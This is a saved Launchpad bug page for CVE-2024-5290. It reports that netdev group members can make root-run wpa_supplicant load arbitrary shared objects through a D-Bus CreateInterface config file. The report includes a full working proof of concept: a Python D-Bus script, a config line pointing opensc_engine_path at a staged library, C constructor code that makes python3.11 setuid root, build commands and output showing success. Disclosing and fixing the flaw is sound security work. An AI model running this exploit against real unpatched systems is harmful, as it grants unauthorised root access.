<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
  <head>
<base href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+index" />

    <meta charset="UTF-8" />
    <title>Bug #2067613 “CVE-2024-5290 : Fix loading of arbitrary shared ob...” : Bugs : wpa package : Ubuntu</title>
    <link rel="apple-touch-icon" sizes="180x180" href="/@@/apple-touch-icon.png?v=2022" />
    <link rel="icon" type="image/png" sizes="32x32" href="/@@/favicon-32x32.png?v=2022" />
    <link rel="icon" type="image/png" sizes="16x16" href="/@@/favicon-16x16.png?v=2022" />
    <link rel="manifest" href="/@@/site.webmanifest?v=2022" />
    <link rel="mask-icon" href="/@@/safari-pinned-tab.svg?v=2022" color="#e9531f" />
    <link rel="shortcut icon" href="/@@/favicon.ico?v=2022" />
    <meta name="msapplication-TileColor" content="#da532c" />
    <meta name="msapplication-config" content="/@@/browserconfig.xml?v=2022" />
    <meta name="theme-color" content="#ffffff" />
    <link rel="canonical" href="https://bugs.launchpad.net/bugs/2067613" />
    
      <link rel="alternate" type="application/atom+xml" href="http://feeds.launchpad.net/bugs/2067613/bug.atom" title="Bug 2067613 Feed" />
    

    
  
  <link type="text/css" rel="stylesheet" media="screen, print" href="/+icing/rev6394e03793719e8d73f5a60b5439440e693c92f1/combo.css" />


    

    
      <meta name="description" content="Hello team 

We received a vulnerability report a while back - that lets users load arbitrary shared object files in the context of the wpa_supplicant process running as root in affected Ubuntu systems.

TLDR : Upstream released a fix : https://w1.fi/cgit/hostap/commit/?id=c84388ee4c66bcd310db57489eac4a75fc600747 that includes a compile time config for allow-listing a set of shared objects.

Details here : 

`wpa_supplicant` is a binary package of source `wpa`
```sh
$ umt search wpa

Running ..." />
      <meta property="og:description" content="Hello team 

We received a vulnerability report a while back - that lets users load arbitrary shared object files in the context of the wpa_supplicant process running as root in affected Ubuntu systems.

TLDR : Upstream released a fix : https://w1.fi/cgit/hostap/commit/?id=c84388ee4c66bcd310db57489eac4a75fc600747 that includes a compile time config for allow-listing a set of shared objects.

Details here : 

`wpa_supplicant` is a binary package of source `wpa`
```sh
$ umt search wpa

Running ..." />
    

    
    
      <meta property="og:title" content="Bug #2067613 “CVE-2024-5290 : Fix loading of arbitrary shared ob...” : Bugs : wpa package : Ubuntu" />
      <meta property="og:type" content="website" />
      <meta property="og:image" content="/@@/launchpad-og-image.png" />
      <meta property="og:url" content="https://bugs.launchpad.net/bugs/2067613" />
      <meta property="og:site_name" content="Launchpad" />
    

    

    
  

  
  
  <script type="text/javascript">
    var LP = {
        cache: {},
        links: {}
    };
  </script>

  

  <script type="text/javascript">var cookie_scope = '; Path=/; Secure; Domain=.launchpad.net';</script>

   <script type="text/javascript" src="/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?yui/yui/yui-min.js&amp;lp/meta.js&amp;yui/loader/loader-min.js"></script>
   <script type="text/javascript">
        var raw = null;
        if (LP.devmode) {
           raw = 'raw';
        }
        YUI.GlobalConfig = {
            combine: true,
            comboBase: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?',
            root: 'yui/',
            filter: raw,
            debug: false,
            fetchCSS: false,
            maxURLLength: 2000,
            groups: {
                lp: {
                    combine: true,
                    base: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?lp/',
                    comboBase: '/+combo/rev6394e03793719e8d73f5a60b5439440e693c92f1/?',
                    root: 'lp/',
                    // comes from including lp/meta.js
                    modules: LP_MODULES,
                    fetchCSS: false
                }
            }
        }</script>

  <script type="text/javascript">
      // we need this to create a single YUI instance all events and code
      // talks across. All instances of YUI().use should be based off of
      // LPJS instead.
      var LPJS = new YUI();
  </script>



    <script id="base-layout-load-scripts" type="text/javascript">
        //<![CDATA[
        LPJS.use('base', 'node', 'console', 'event',
            'oop', 'lp', 'lp.app.foldables','lp.app.sorttable',
            'lp.app.inlinehelp', 'lp.app.links',
            'lp.bugs.bugtask_index', 'lp.bugs.subscribers',
            'lp.app.ellipsis', 'lp.code.branchmergeproposal.diff',
            'lp.views.global',
             function(Y) {

            Y.on("domready", function () {
                var global_view = new Y.lp.views.Global();
                global_view.render();

                Y.lp.app.sorttable.SortTable.init();
                Y.lp.app.inlinehelp.init_help();
                Y.lp.activate_collapsibles();
                Y.lp.app.foldables.activate();
                Y.lp.app.links.check_valid_lp_links();
            });

            Y.on('lp:context:web_link:changed', function(e) {
                  window.location = e.new_value;
            });
        });
        //]]>
    </script>
    <script id="base-helper-functions" type="text/javascript">
         //<![CDATA[
        // This code is pulled from lp.js that needs to be available on every
        // request. Pulling here to get it outside the scope of the YUI block.
        function setFocusByName(name) {
            // Focus the first element matching the given name which can be focused.
            var nodes = document.getElementsByName(name);
            var i, node;
            for (i = 0; i < nodes.length; i++) {
                node = nodes[i];
                if (node.focus) {
                    try {
                        // Trying to focus a hidden element throws an error in IE8.
                        if (node.offsetHeight !== 0) {
                            node.focus();
                        }
                    } catch (e) {
                        LPJS.use('console', function(Y) {
                            Y.log('In setFocusByName(<' +
                                node.tagName + ' type=' + node.type + '>): ' + e);
                        });
                    }
                    break;
                }
            }
        }

        function selectWidget(widget_name, event) {
          if (event && (event.keyCode === 9 || event.keyCode === 13)) {
              // Avoid firing if user is tabbing through or simply pressing
              // enter to submit the form.
              return;
          }
          document.getElementById(widget_name).checked = true;
        }
        //]]>
    </script>

    
      
      <script type="text/javascript" id="available-official-tags-js">var available_official_tags = ["a11y", "appstream", "bionic", "bisect-done", "bitesize", "block-proposed", "block-proposed-focal", "block-proposed-jammy", "block-proposed-noble", "block-proposed-oracular", "cherry-pick", "community-security", "desktop-file", "dist-upgrade", "fixed-upstream", "focal", "ftbfs", "hw-specific", "jammy", "kernel-bug", "manpage", "metabug", "multiarch", "multigpu", "multimonitor", "needs-bisect", "needs-design", "needs-packaging", "needs-reassignment", "noble", "nvidia", "oracular", "package-conflict", "packaging", "patch", "patch-accepted-debian", "patch-accepted-upstream", "patch-forwarded-debian", "patch-forwarded-upstream", "patch-needswork", "patch-rejected", "patch-rejected-debian", "patch-rejected-upstream", "performing-bisect", "plucky", "qt4-removal", "regression-proposed", "regression-release", "regression-update", "string-fix", "suspend-resume", "systemd-boot", "testcase", "unmetdeps", "update-excuse", "upgrade-software-version", "verification-done-bionic", "verification-done-focal", "verification-done-jammy", "verification-done-noble", "verification-done-oracular", "verification-failed-bionic", "verification-failed-jammy", "verification-needed-bionic", "verification-needed-focal", "verification-needed-jammy", "verification-needed-noble", "verification-needed-oracular", "wayland"];</script>
      <script type="text/javascript">
        LPJS.use('base', 'node', 'oop', 'event', 'lp.bugs.bugtask_index',
                  'lp.bugs.subscribers', 'lp.code.branchmergeproposal.diff',
                  'lp.app.comment', 'lp.services.messages.edit', function(Y) {
            Y.on('domready', function() {
                Y.lp.code.branchmergeproposal.diff.connect_diff_links();
                Y.lp.bugs.bugtask_index.setup_bugtask_index();
                Y.lp.bugs.bugtask_index.setup_bugtask_table();
                LP.cache.comment_context = LP.cache.bug;
                var cl = new Y.lp.app.comment.CommentList();
                cl.render();
                var sl = new Y.lp.bugs.subscribers.createBugSubscribersLoader({
                    container_box: '#other-bug-subscribers',
                    subscribers_details_view:
                        '/+bug-portlet-subscribers-details',
                    subscribe_someone_else_link: '.menu-link-addsubscriber'
                }, window);

                Y.lp.services.messages.edit.setup();
            });
         });
      </script>
      <style type="text/css">
        /* Align the 'add comment' link to the right of the comment box. */
        #add-comment-form textarea { width: 100%; }
        #add-comment-form { max-width: 60em; padding-bottom: 4em; }
        #add-comment-form .actions {float: right;}
        .buglink-summary dd { font-size: 10px; }
        a#privacy-link:link:hover, a#privacy-link:visited:hover {text-decoration:none;}
      </style>
      <style type="text/css">
        .yui3-overlay .value label  {
          /* It normally makes sense for form labels to be bold, but since
          this form consists only of radio buttons, there's nothing but labels
          so we just get wall-to-wall bold. */
          font-weight: normal !important;
        }
      </style>
    
    
  </head>

  <body id="document" itemscope="" itemtype="http://schema.org/WebPage" class="tab-bugs
      main_side
      public
      yui3-skin-sam">
          
          
    <div class="yui-d0">
      <div id="locationbar" class="login-logout">
        

<div id="logincontrol"><a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613/+login">Log in / Register</a></div>



      </div><!--id="locationbar"-->

      <div id="watermark" class="watermark-apps-portlet">
        <div>
          <a href="https://launchpad.net/ubuntu"><img alt="" width="64" height="64" src="https://launchpadlibrarian.net/606381979/CoF%2064px.png" /></a>
        </div>
        <div class="wide">
          <h2 id="watermark-heading"><a href="https://launchpad.net/ubuntu">Ubuntu</a><br /><a href="https://launchpad.net/ubuntu/+source/wpa">wpa package</a></h2>
        </div>
        
  <!-- Application Menu -->
  <ul class="facetmenu">
    
      
      <li class="overview"><a href="https://launchpad.net/ubuntu/+source/wpa">Overview</a></li>
      
    
    
      
      <li class="branches"><a href="https://code.launchpad.net/ubuntu/+source/wpa">Code</a></li>
      
    
    
      <li class="bugs active"><a href="https://bugs.launchpad.net/ubuntu/+source/wpa">Bugs</a></li>
      
      
    
    
      
      
      <li class="specifications disabled-tab"><span>Blueprints</span></li>
    
    
      
      <li class="translations"><a href="https://translations.launchpad.net/ubuntu/+source/wpa">Translations</a></li>
      
    
    
      
      <li class="answers"><a href="https://answers.launchpad.net/ubuntu/+source/wpa">Answers</a></li>
      
    
  </ul>

      </div>

      <div class="yui-t4">
        <div id="maincontent" class="yui-main">
          <div class="yui-b" dir="ltr">
            <div class="context-publication">
              
      <h1 id="edit-title">
<span class="yui3-editable_text-text ellipsis" style="max-width: 95%;">
    CVE-2024-5290 : Fix loading of arbitrary shared objects
</span>
  
</h1>



    
              

              <div id="registration" class="registering">
                
      Bug #2067613 reported by
      <a href="https://launchpad.net/~sudhackar" class="sprite person">Sudhakar Verma</a>
      <time title="2024-05-30 13:26:43 UTC" datetime="2024-05-30T13:26:43.672325+00:00">on 2024-05-30</time>
      
    
              </div>
            </div>

            
            <div id="request-notifications">
              
            </div>

            
              <div>

      

      <div id="bug-is-duplicate">
          
      </div>
      

      <div style="float: right;">
        <span><a href="/+help-bugs/bug-heat.html" target="help" class="sprite flame">288</a></span>
      </div>

      


  
  
    <div class="actions">
      <span id="affectsmetoo" style="display: inline">This bug affects 1 person</span>
    </div>
  



    <table id="affected-software" class="listing">
      <thead>
        <tr>
          <th colspan="2">Affects</th>
          <th>Status</th>
          <th>Importance</th>
          <th>Assigned to</th>
          <th>Milestone</th>
        </tr>
      </thead>

      <tbody>
        
          
  <tr id="tasksummary3239985">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3239985">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/debian/+source/wpa" title="Latest release: 2:2.9.0-21+deb11u2, uploaded to main on 2024-08-31 17:35:57.929150+00:00 by Debian wpasupplicant Maintainers (wpa), maintained by Debian wpasupplicant Maintainers (wpa)">wpa (Debian)</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceHIGH">High</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3239985">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~andrew.sh">Andrej Shadura</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      
    </td>

    
  </tr>

  


        
        
          
  <tr class="highlight" id="tasksummary3201286">
    <td>
      
    </td>
    
    <td>
      <span id="bugtarget-picker-tasksummary3201286">
        <span class="yui3-activator-data-box">
            <a class="sprite package-source" href="https://bugs.launchpad.net/ubuntu/+source/wpa" title="Latest release: 2:2.10-22, uploaded to main on 2024-08-07 04:51:12.941943+00:00 by Debian wpasupplicant Maintainers (wpa), maintained by Debian wpasupplicant Maintainers (wpa)">wpa (Ubuntu)</a>
        </span>
        
        <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        
      </span>
    </td>

    

    
    <td style="width: 20%; vertical-align: middle">
      <div class="status-content" style="width: 100%; float: left">
        <span style="float: left" class="value statusFIXRELEASED">Fix Released</span>
        
      </div>
    </td>

    
    <td style="width: 15em; vertical-align: middle">
      <div class="importance-content" style="width: 100%; float: left">
        <span style="float: left" class="value importanceUNDECIDED">Undecided</span>
      </div>
    </td>

    <td style="width:20%; margin: 0; padding: 0;
               vertical-align: middle; padding-left: 0.5em">
      

      
        <span id="assignee-picker-tasksummary3201286">
          <span class="yui3-activator-data-box">
            <a class="sprite person" href="https://launchpad.net/~sudhackar">Sudhakar Verma</a>
            
          </span>
          
          
          <div class="yui3-activator-message-box yui3-activator-hidden"></div>
        </span>
      
    </td>

    <td style="width: 20%; vertical-align: middle">
      <div class="milestone-content" style="width: 100%; float: left">
        
        <a class="value" href=""></a>
        
      </div>
    </td>

    
  </tr>

  


        
      </tbody>

    </table>








      <div id="maincontentsub">
        <div class="top-portlet">

      <div itemprop="mainContentOfPage" class="report">
        

        <div>
  <div class="lazr-multiline-edit" id="edit-description">
  <div class="clearfix">
    

    <h3>Bug Description</h3>
  </div>

  <div class="yui3-editable_text-text"><p>Hello team</p>
<p>We received a vulnerability report a while back - that lets users load arbitrary shared object files in the context of the wpa_supplicant process running as root in affected Ubuntu systems.</p>
<p>TLDR : Upstream released a fix : <a rel="nofollow" href="https://w1.fi/cgit/hostap/commit/?id=c84388ee4c66bcd310db57489eac4a75fc600747">https:/<wbr />/w1.fi/<wbr />cgit/hostap/<wbr />commit/<wbr />?id=c84388ee4c6<wbr />6bcd310db57489e<wbr />ac4a75fc600747</a> that includes a compile time config for allow-listing a set of shared objects.</p>
<p>Details here :</p>
<p>`wpa_supplicant` is a binary package of source `wpa`<br />
```sh<br />
$ umt search wpa</p>
<p>Running search command.</p>
<p>Ubuntu packages:</p>
<p>&nbsp;&nbsp;&nbsp;Release Version                               Pocket Component<br />
&nbsp;&nbsp;&nbsp;&nbsp;trusty 2.1-0ubuntu1.7                      security      main<br />
trusty/esm 2.1-0ubuntu1.7+esm4                 security      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;xenial 2.4-0ubuntu6.8                      security      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;bionic 2:2.6-15ubuntu2.8                   security      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;focal 2:2.9-1ubuntu4.3                    security      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jammy 2:2.10-6ubuntu2                      updates      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lunar 2:2.10-12                            release      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;mantic 2:2.10-15                            release      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;noble 2:2.10-21build4                      release      main</p>
<p>Other packages:</p>
<p>&nbsp;&nbsp;&nbsp;Release Version                               Pocket Component<br />
&nbsp;&nbsp;bookworm 2:2.10-12                            release      main<br />
&nbsp;&nbsp;bullseye 2:2.9.0-21                           release      main<br />
&nbsp;&nbsp;&nbsp;&nbsp;buster 2:2.7+git201901<wbr />28+0c1e29f-<wbr />6+deb10u4  updates      main<br />
&nbsp;&nbsp;&nbsp;testing 2:2.10-21.1                          release      main<br />
&nbsp;&nbsp;unstable 2:2.10-21.1                          release      main<br />
```<br />
Upstream - <a rel="nofollow" href="https://w1.fi/cgit">https:/<wbr />/w1.fi/<wbr />cgit</a><br />
upstream examples point to config that lets all users in group `wheel` access the frontend.</p>
<p>debian and ubuntu use group membership to control access to D-Bus<br />
So in `debian/<wbr />patches/<wbr />02_dbus_<wbr />group_policy.<wbr />patch`<br />
```<br />
diff --git a/wpa_supplican<wbr />t/dbus/<wbr />dbus-wpa_<wbr />supplicant.<wbr />conf b/wpa_supplican<wbr />t/dbus/<wbr />dbus-wpa_<wbr />supplicant.<wbr />conf<br />
index e81b495..413c049 100644<br />
--- a/wpa_supplican<wbr />t/dbus/<wbr />dbus-wpa_<wbr />supplicant.<wbr />conf<br />
+++ b/wpa_supplican<wbr />t/dbus/<wbr />dbus-wpa_<wbr />supplicant.<wbr />conf<br />
@@ -9,6 +9,11 @@<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&lt;allow send_interface=<wbr />&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot;/&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&lt;allow receive_<wbr />sender=<wbr />&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot; receive_<wbr />type=&quot;signal&quot;<wbr />/&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/policy&gt;<br />
+        &lt;policy group=&quot;netdev&quot;&gt;<br />
+                &lt;allow send_destinatio<wbr />n=&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot;/&gt;<br />
+                &lt;allow send_interface=<wbr />&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot;/&gt;<br />
+                &lt;allow receive_<wbr />sender=<wbr />&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot; receive_<wbr />type=&quot;signal&quot;<wbr />/&gt;<br />
+        &lt;/policy&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;policy context=&quot;default&quot;&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&lt;deny own=&quot;fi.<wbr />w1.wpa_<wbr />supplicant1&quot;<wbr />/&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&lt;deny send_destinatio<wbr />n=&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot;/&gt;<br />
```<br />
to allow `netdev` users access to the wpa_supplicant which gets started as a service<br />
```<br />
diff --git a/wpa_supplican<wbr />t/systemd/<wbr />wpa_supplicant.<wbr />service.<wbr />in b/wpa_supplican<wbr />t/systemd/<wbr />wpa_supplicant.<wbr />service.<wbr />in<br />
index 18cbc11..f02bc15 100644<br />
--- a/wpa_supplican<wbr />t/systemd/<wbr />wpa_supplicant.<wbr />service.<wbr />in<br />
+++ b/wpa_supplican<wbr />t/systemd/<wbr />wpa_supplicant.<wbr />service.<wbr />in<br />
@@ -8,8 +8,11 @@ IgnoreOnIsolate<wbr />=true<br />
&nbsp;[Service]<br />
&nbsp;Type=dbus<br />
&nbsp;BusName=<wbr />fi.w1.wpa_<wbr />supplicant1<br />
-ExecStart=<wbr />@BINDIR@<wbr />/wpa_supplicant -u -s -O /run/wpa_supplicant<br />
+ExecStart=<wbr />@BINDIR@<wbr />/wpa_supplicant -u -s -O &quot;DIR=/run/<wbr />wpa_supplicant GROUP=netdev&quot;<br />
&nbsp;ExecReload=<wbr />/bin/kill -HUP $MAINPID<br />
+Group=netdev<br />
+RuntimeDirecto<wbr />ry=wpa_<wbr />supplicant<br />
+RuntimeDirecto<wbr />ryMode=<wbr />0750</p>
<p>&nbsp;[Install]<br />
&nbsp;WantedBy=<wbr />multi-user.<wbr />target<br />
```</p>
<p>If a user is able to escalate to `netdev` - they will be able to interact with the dbus interface.<br />
One of the interface `fi.w1.<wbr />wpa_supplicant1<wbr />` lets the user create a network interface via `CreateInterface` - See [`wpas_<wbr />dbus_handler_<wbr />create_<wbr />interface`<wbr />](<a rel="nofollow" href="http://w1.fi/wpa_supplicant/devel/dbus__new__handlers_8h.html#a4c504285e9504dc5508f35646278f867">http://<wbr />w1.fi/wpa_<wbr />supplicant/<wbr />devel/dbus_<wbr />_new__handlers_<wbr />8h.html#<wbr />a4c504285e9504d<wbr />c5508f35646278f<wbr />867</a>)</p>
<p>`ConfigFile` has configurations for a network interface<br />
* for loading an opensc engine with `opensc_<wbr />engine_<wbr />path`which is a path to a shared object. See [`opensc_<wbr />engine_<wbr />path`](<a rel="nofollow" href="https://w1.fi/wpa_supplicant/devel/structwpa__config.html#a791fade4701a30852dbb2b25866ba359">https:/<wbr />/w1.fi/<wbr />wpa_supplicant/<wbr />devel/structwpa<wbr />__config.<wbr />html#a791fade47<wbr />01a30852dbb2b25<wbr />866ba359</a>)<br />
* for loading a PKCS#11 engine with `pkcs11_<wbr />engine_<wbr />path` which is a path to a shared object. See [`pkcs11_<wbr />engine_<wbr />path`](<a rel="nofollow" href="https://w1.fi/wpa_supplicant/devel/structwpa__config.html#adf38e52ccfe1b621ef5a18b78b1c3a9e">https:/<wbr />/w1.fi/<wbr />wpa_supplicant/<wbr />devel/structwpa<wbr />__config.<wbr />html#adf38e52cc<wbr />fe1b621ef5a18b7<wbr />8b1c3a9e</a>)</p>
<p>Both these paths don&#x27;t check for paths - any arbitrary location - leading to arbitrary code execution.</p>
<p>Overall any user within the group `netdev` would be able to load arbitrary shared objects - in the context of a process running as root - granting privilege escalation to `root`<br />
The process that loads these objects is launched with<br />
`/usr/sbin/<wbr />wpa_supplicant -u -s -O DIR=/run/<wbr />wpa_supplicant GROUP=netdev `<br />
the trace looks like<br />
```<br />
openat(AT_FDCWD, &quot;/tmp/stage/<wbr />loadable.<wbr />so&quot;, O_RDONLY|O_CLOEXEC) = 8<br />
read(8, &quot;\177ELF\<wbr />2\1\1\0\<wbr />0\0\0\0\<wbr />0\0\0\0\<wbr />3\0&gt;\0\<wbr />1\0\0\0\<wbr />0\0\0\0\<wbr />0\0\0\0&quot;<wbr />..., 832) = 832<br />
fstat(8, {st_mode=<wbr />S_IFREG|<wbr />0755, st_size=15544, ...}) = 0<br />
mmap(NULL, 16408, PROT_READ, MAP_PRIVATE|<wbr />MAP_DENYWRITE, 8, 0) = 0x7b77cdcde000<br />
mmap(0x7b77cdcd<wbr />f000, 4096, PROT_READ|<wbr />PROT_EXEC, MAP_PRIVATE|<wbr />MAP_FIXED|<wbr />MAP_DENYWRITE, 8, 0x1000) = 0x7b77cdcdf000<br />
mmap(0x7b77cdce<wbr />0000, 4096, PROT_READ, MAP_PRIVATE|<wbr />MAP_FIXED|<wbr />MAP_DENYWRITE, 8, 0x2000) = 0x7b77cdce0000<br />
mmap(0x7b77cdce<wbr />1000, 8192, PROT_READ|<wbr />PROT_WRITE, MAP_PRIVATE|<wbr />MAP_FIXED|<wbr />MAP_DENYWRITE, 8, 0x2000) = 0x7b77cdce1000<br />
close(8)                                = 0<br />
mprotect(<wbr />0x7b77cdce1000, 4096, PROT_READ) = 0<br />
```</p>
<p>Example from my 23.11 test machine<br />
```<br />
$ \cat wpa.py<br />
import dbus<br />
open(&quot;/tmp/done&quot;, &quot;w&quot;).write(&quot;done&quot;)<br />
system_bus = dbus.SystemBus()<br />
wpasupplicant = system_<wbr />bus.get_<wbr />object(<wbr />&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot;, &quot;/fi/w1/<wbr />wpa_supplicant1<wbr />&quot;)</p>
<p>wpasupplicant.<wbr />CreateInterface<wbr />(dbus.types.<wbr />Dictionary(<wbr />{<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;Ifname&quot;: &quot;lo&quot;,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;ConfigFile&quot;: &quot;/tmp/stage/<wbr />wpa_conf&quot;<wbr />,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&quot;Driver&quot;: &quot;wired&quot;<br />
}, signature=&quot;sv&quot;), dbus_interface=<wbr />&quot;fi.w1.<wbr />wpa_supplicant1<wbr />&quot;)</p>
<p>$ cat &gt;&gt; /tmp/stage/wpa_conf &lt;&lt;EOF<br />
opensc_<wbr />engine_<wbr />path=/tmp/<wbr />stage/loadable.<wbr />so<br />
EOF</p>
<p>$ ll /usr/bin/python3.11<br />
Permissions Size User Date Modified Name<br />
.rwxr-xr-x  6.8M root  8 Oct  2023  /usr/bin/python3.11</p>
<p>$ \cat loadable.c<br />
#include &lt;sys/stat.h&gt;<br />
void __attribute_<wbr />_((constructor)<wbr />) so_main() {<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;chmod(<wbr />&quot;/usr/bin/<wbr />python3.<wbr />11&quot;, 04755);<br />
}</p>
<p>$ gcc -fPIC -shared -o loadable.so loadable.c<br />
$ cp loadable.so /tmp/stage<br />
$ chmod -R 777 /tmp/stage<br />
# sg netdev -c &#x27;python3 wpa.py&#x27;<br />
Traceback (most recent call last):<br />
&nbsp;&nbsp;File &quot;/home/<wbr />sudhackar/<wbr />Desktop/<wbr />psirt/rory/<wbr />wpa.py&quot;<wbr />, line 6, in &lt;module&gt;<br />
&nbsp;&nbsp;&nbsp;&nbsp;wpasupplica<wbr />nt.CreateInterf<wbr />ace(dbus.<wbr />types.Dictionar<wbr />y({<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />dbus/proxies.<wbr />py&quot;, line 72, in __call__<br />
&nbsp;&nbsp;&nbsp;&nbsp;return self._proxy_<wbr />method(<wbr />*args, **keywords)<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />dbus/proxies.<wbr />py&quot;, line 141, in __call__<br />
&nbsp;&nbsp;&nbsp;&nbsp;return self._connectio<wbr />n.call_<wbr />blocking(<wbr />self._named_<wbr />service,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^<br />
&nbsp;&nbsp;File &quot;/usr/lib/<wbr />python3/<wbr />dist-packages/<wbr />dbus/connection<wbr />.py&quot;, line 634, in call_blocking<br />
&nbsp;&nbsp;&nbsp;&nbsp;reply_message = self.send_<wbr />message_<wbr />with_reply_<wbr />and_block(<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^^^^^<wbr />^^^<br />
dbus.exceptions<wbr />.DBusException: fi.w1.wpa_<wbr />supplicant1.<wbr />UnknownError: wpa_supplicant couldn&#x27;t grab this interface.<br />
$ ll /usr/bin/python3.11<br />
Permissions Size User Date Modified Name<br />
.rwsr-xr-x  6.8M root  8 Oct  2023  /usr/bin/python3.11<br />
```</p></div>
  </div>

  
</div>


        <div style="margin:-10px 0 20px 5px" class="clearfix">
          
        </div>

        <div id="bug-tags">
          <span id="tags-heading">
            
          </span>
          <span id="tag-list">
          </span>
          
        </div>

        <script type="text/javascript">
          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
              Y.on('domready',
                   function(e) {
                       Y.lp.bugs.tags_entry.setup_tag_entry(
                           available_official_tags);
                   },
                   window);
          });
        </script>

        <div class="clearfix"></div>
      </div>

      <div id="branches-and-cves">
        <div id="bug-branches-container" style="float: left">
          
        </div><!-- bug-branch-container -->

        <div class="cves">
          <h2>CVE References</h2>
          <ul>
            <li class="sprite cve">
              <a href="/bugs/cve/2010-3856" title="ld.so in the GNU C Library (aka glibc...">2010-3856</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2023-38408" title="The PKCS#11 feature in ssh-agent in O...">2023-38408</a>
            </li>
            <li class="sprite cve">
              <a href="/bugs/cve/2024-5290" title="** RESERVED ** This candidate has bee...">2024-5290</a>
            </li>
          </ul>
        </div>

        <div class="clearfix"></div>
      </div> <!-- branches and CVEs -->

      </div>

      <div>
      
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/wpa/+bug/2067613/comments/1" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
